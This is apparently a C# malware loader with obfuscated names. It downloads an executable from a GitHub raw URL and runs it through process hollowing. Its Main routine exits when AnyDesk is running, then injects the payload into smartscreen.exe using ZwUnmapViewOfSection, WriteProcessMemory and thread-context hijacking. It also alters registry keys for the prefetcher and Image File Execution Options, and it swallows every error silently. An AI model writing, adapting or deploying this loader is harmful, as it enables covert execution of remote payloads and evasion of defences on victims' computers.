using System;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Linq;
using Microsoft.Win32;
using System.Management;

namespace abc
{
    public static class def
    {
        #region DllImport
        [DllImport("kernel32.dll")]
        private static extern bool CreateProcess(string lpApplicationName,
                                                 string lpCommandLine,
                                                 IntPtr lpProcessAttributes,
                                                 IntPtr lpThreadAttributes,
                                                 bool bInheritHandles,
                                                 uint dwCreationFlags,
                                                 IntPtr lpEnvironment,
                                                 string lpCurrentDirectory,
                                                 byte[] lpStartupInfo,
                                                 byte[] lpProcessInformation);

        [DllImport("kernel32.dll")]
        private static extern long VirtualAllocEx(long hProcess,
                                                  long lpAddress,
                                                  long dwSize,
                                                  uint flAllocationType,
                                                  uint flProtect);

        [DllImport("kernel32.dll")]
        private static extern long WriteProcessMemory(long hProcess,
                                                      long lpBaseAddress,
                                                      byte[] lpBuffer,
                                                      int nSize,
                                                      long written);

        [DllImport("ntdll.dll")]
        private static extern uint ZwUnmapViewOfSection(long ProcessHandle,
                                                        long BaseAddress);

        [DllImport("kernel32.dll")]
        private static extern bool SetThreadContext(long hThread,
                                                    IntPtr lpContext);

        [DllImport("kernel32.dll")]
        private static extern bool GetThreadContext(long hThread,
                                                    IntPtr lpContext);

        [DllImport("kernel32.dll")]
        private static extern uint ResumeThread(long hThread);

        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(long handle);
        #endregion

        public static void Load(byte[] buffer, string host, string args)
        {
            int e_lfanew = Marshal.ReadInt32(buffer, 0x3c);
            int sizeOfImage = Marshal.ReadInt32(buffer, e_lfanew + 0x18 + 0x038);
            int sizeOfHeaders = Marshal.ReadInt32(buffer, e_lfanew + 0x18 + 0x03c);
            int entryPoint = Marshal.ReadInt32(buffer, e_lfanew + 0x18 + 0x10);

            short numberOfSections = Marshal.ReadInt16(buffer, e_lfanew + 0x4 + 0x2);
            short sizeOfOptionalHeader = Marshal.ReadInt16(buffer, e_lfanew + 0x4 + 0x10);

            long imageBase = Marshal.ReadInt64(buffer, e_lfanew + 0x18 + 0x18);

            byte[] bStartupInfo = new byte[0x68];
            byte[] bProcessInfo = new byte[0x18];

            IntPtr pThreadContext = Allocate(0x4d0, 16);

            string targetHost = host;
            if (!string.IsNullOrEmpty(args))
                targetHost += " " + args;
            string currentDirectory = Directory.GetCurrentDirectory();

            Registry.LocalMachine.OpenSubKey(@"SYSTEM\ControlSet001\Control\Session Manager\Memory Management\PrefetchParameters", true)?
                .DeleteValue("EnablePrefetcher", false);

            Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\crashhelper.exe", true)?
                .DeleteValue("Debugger", false);

            Marshal.WriteInt32(pThreadContext, 0x30, 0x0010001b);

            CreateProcess(null, targetHost, IntPtr.Zero, IntPtr.Zero, true, 0x4u, IntPtr.Zero, currentDirectory, bStartupInfo, bProcessInfo);
            long processHandle = Marshal.ReadInt64(bProcessInfo, 0x0);
            long threadHandle = Marshal.ReadInt64(bProcessInfo, 0x8);

            ZwUnmapViewOfSection(processHandle, imageBase);
            VirtualAllocEx(processHandle, imageBase, sizeOfImage, 0x3000, 0x40);
            WriteProcessMemory(processHandle, imageBase, buffer, sizeOfHeaders, 0L);

            for (short i = 0; i < numberOfSections; i++)
            {
                byte[] section = new byte[0x28];
                Buffer.BlockCopy(buffer, e_lfanew + (0x18 + sizeOfOptionalHeader) + (0x28 * i), section, 0, 0x28);

                int virtualAddress = Marshal.ReadInt32(section, 0x00c);
                int sizeOfRawData = Marshal.ReadInt32(section, 0x010);
                int pointerToRawData = Marshal.ReadInt32(section, 0x014);

                byte[] bRawData = new byte[sizeOfRawData];
                Buffer.BlockCopy(buffer, pointerToRawData, bRawData, 0, bRawData.Length);

                WriteProcessMemory(processHandle, imageBase + virtualAddress, bRawData, bRawData.Length, 0L);
            }

            GetThreadContext(threadHandle, pThreadContext);

            byte[] bImageBase = BitConverter.GetBytes(imageBase);

            long rdx = Marshal.ReadInt64(pThreadContext, 0x88);
            WriteProcessMemory(processHandle, rdx + 16, bImageBase, 8, 0L);

            Marshal.WriteInt64(pThreadContext, 0x80 /* rcx */, imageBase + entryPoint);

            SetThreadContext(threadHandle, pThreadContext);
            ResumeThread(threadHandle);

            Marshal.FreeHGlobal(pThreadContext);
            CloseHandle(processHandle);
            CloseHandle(threadHandle);
        }

        private static IntPtr Align(IntPtr source, int alignment)
        {
            long source64 = source.ToInt64() + (alignment - 1);
            long aligned = alignment * (source64 / alignment);
            return new IntPtr(aligned);
        }

        private static IntPtr Allocate(int size, int alignment)
        {
            IntPtr allocated = Marshal.AllocHGlobal(size + (alignment / 2));
            return Align(allocated, alignment);
        }
    }

    class Program
    {
        static string GetProcessorId()
        {
            try
            {
                var searcher = new ManagementObjectSearcher("select ProcessorId from Win32_Processor");
                foreach (ManagementObject obj in searcher.Get())
                {
                    return obj["ProcessorId"]?.ToString();
                }
                return null;
            }
            catch
            {
                return null;
            }
        }

        static async Task Main()
        {
            
            string ID = GetProcessorId();

            if (IsProcessRunning("AnyDesk"))
            {
                return;
            }

            try
            {
                string Url = "https://github.com/fonfon08/mystuffzx/raw/refs/heads/main/exelon.exe";
                string File = @"C:\Windows\System32\smartscreen.exe";

                byte[] Data = await DownloadFileAsync(Url);

                def.Load(Data, File, string.Empty);

                Registry.LocalMachine.OpenSubKey(@"SYSTEM\ControlSet001\Control\Session Manager\Memory Management\PrefetchParameters", true)?
                    .SetValue("EnablePrefetcher", 3, RegistryValueKind.DWord);

                Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\crashhelper.exe", true)?
               .DeleteValue("Debugger", false);

            }
            catch (Exception)
            {
            }
        }

        static bool IsProcessRunning(string processName)
        {
            return Process.GetProcessesByName(processName).Any();
        }

        static async Task<byte[]> DownloadFileAsync(string url)
        {
            using (HttpClient client = new HttpClient())
            {
                HttpResponseMessage response = await client.GetAsync(url);
                response.EnsureSuccessStatusCode();
                return await response.Content.ReadAsByteArrayAsync();
            }
        }
    }
}
